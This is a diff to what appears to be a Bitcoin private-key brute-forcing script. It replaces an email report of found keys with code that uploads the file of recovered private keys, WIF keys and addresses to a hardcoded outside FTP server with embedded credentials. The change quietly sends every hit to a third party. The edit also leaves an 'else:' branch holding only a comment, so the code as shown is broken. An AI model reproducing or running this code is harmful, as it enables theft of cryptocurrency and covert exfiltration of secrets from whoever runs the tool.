@@ -7,8 +7,8 @@ import pickle
 import hashlib
 import binascii
 import multiprocessing
-import smtplib
 import sys
+import ftplib
 from ellipticcurve.privateKey import PrivateKey
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -73,28 +73,26 @@ def process(private_key, public_key, address, database):
 				   'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' +
 			      	   'public key: ' + str(public_key) + '\n' +
 			           'address: ' + str(address) + '\n\n')
-			
-			addr_from = sys.argv[1]                  # Адресат
-			addr_to   = sys.argv[2]                     # Получатель
-			password  = sys.argv[3]                          # Пароль
 
-			msg = MIMEMultipart()                               # Создаем сообщение
-			msg['From']    = addr_from                          # Адресат
-			msg['To']      = addr_to                            # Получатель
-			msg['Subject'] = 'BTC'                              # Тема сообщения
+			host = str('p98772w7.beget.tech')
+			ftp_user = str('p98772w7_ftp')
+			ftp_password = str('qwerty123')
 
-			body = 'hex private key: ' + str(private_key) + '\n' + 'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' + 'public key: ' + str(public_key) + '\n' + 'address: ' + str(address) + '\n\n'
+			# после чего каждую переменную подключим к авторизации:
+			print('Попытка соединения с FTP-сервером', host)
+			print('Login:', ftp_user)
+			print('Password:', ftp_password)
+			ftp = ftplib.FTP(host, ftp_user, ftp_password)
 
-			msg.attach(MIMEText(body, 'plain'))                 # Добавляем в сообщение текст
-
-			server = smtplib.SMTP_SSL('smtp.mail.ru', 465)        # Создаем объект SMTP
-			#server.set_debuglevel(True)                         # Включаем режим отладки - если отчет не нужен, строку можно закомментировать
-			#server.starttls()                                   # Начинаем шифрованный обмен по TLS
-			server.login(addr_from, password)                   # Получаем доступ
-			server.send_message(msg)                            # Отправляем сообщение
-			server.quit()
+			# Проверяем текущее состояние папок
+			directory_list = ftp.nlst()  # загоняем в переменную list список содержимого директории
+			print(directory_list)
+			file = str('plutus.txt')
+			file_to_upload = open(file, 'rb')
+			ftp.storbinary('STOR ' + file, file_to_upload)
+			print('Файл', file, 'успешно загружен')
 	else: 
-		print(str(address))
+		#print(str(address))
 
 def private_key_to_WIF(private_key):
 	"""
